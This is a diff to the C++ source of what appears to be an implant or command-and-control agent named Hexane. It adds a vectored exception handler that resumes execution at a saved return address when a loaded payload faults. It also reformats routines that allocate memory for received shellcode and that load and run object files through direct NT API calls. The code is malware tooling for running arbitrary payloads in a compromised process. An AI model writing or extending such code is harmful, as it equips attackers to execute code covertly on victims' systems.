@@ -4,6 +4,8 @@
 #endif
 
 namespace Memory {
+    LPVOID ExceptionReturn = 0;
+
     namespace Methods {
 
         UINT_PTR GetStackCookie() {
@@ -665,6 +667,13 @@ namespace Memory {
 
     namespace Execute {
 
+        LONG WINAPI Debugger(EXCEPTION_POINTERS *exception) {
+            HEXANE
+
+            exception->ContextRecord->IP_REG = ExceptionReturn;
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+
         VOID ExecuteCommand(_parser &parser) {
             HEXANE
 
@@ -690,11 +699,11 @@ namespace Memory {
             defer:
         }
 
-        VOID ExecuteShellcode(const _parser &parser) {
+        VOID ExecuteShellcode(const _parser& parser) {
             HEXANE
 
-            void *address  = { };
-            void (*exec)() = { };
+            void* address   = { };
+            void (*exec)()  = { };
             size_t size = parser.Length;
 
             if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtAllocateVirtualMemory(NtCurrentProcess(), &address, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
@@ -711,11 +720,11 @@ namespace Memory {
 
             x_memset(address, 0, size);
 
-            defer:
+        defer:
             if (address) {
-                    ntstatus = Ctx->Nt.NtFreeVirtualMemory(NtCurrentProcess(), &address, &size, MEM_FREE);
-                }
+                ntstatus = Ctx->Nt.NtFreeVirtualMemory(NtCurrentProcess(), &address, &size, MEM_FREE);
             }
+        }
 
         BOOL ExecuteObject(_executable *object, const char *entrypoint, char *args, uint32_t size, uint32_t req_id) {
             HEXANE
@@ -793,7 +802,7 @@ namespace Memory {
 
             if (success) {
                 const auto entry = R_CAST(obj_entry, exec);
-                const auto ret = __builtin_extract_return_addr(__builtin_return_address(0)); // meant for the veh handler
+                ExceptionReturn = __builtin_extract_return_addr(__builtin_return_address(0)); // meant for the veh handler
                 entry(args, size);
             }
 
